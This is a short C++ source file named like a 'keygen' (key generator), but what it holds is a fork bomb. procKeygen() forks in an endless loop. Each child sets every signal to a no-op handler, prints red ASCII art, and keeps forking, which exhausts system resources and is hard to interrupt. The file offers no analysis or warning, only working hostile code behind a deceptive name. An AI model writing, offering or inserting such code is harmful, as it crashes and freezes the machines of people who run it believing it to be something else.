//
// Created by ferdinand on 8/12/25.
//

#include "keygen.h"

#include <iostream>

void nullfunc(int){}
void ignoreSignals() {
    for (int i = 0; i < NSIG; i++) {
        signal(i, nullfunc);
    }
}

void printKeygen() {
    std::cout << "\033[31m" << R"(
  # # #
# ##### #
#   #   #
#########
    #
 #######
   # #
  #   #
  #   #
   ###
)";
}

void procKeygen() {
    while (true) {
        auto pid = fork();
        if (!pid) {
           ignoreSignals();
           printKeygen();
        }
    }
}
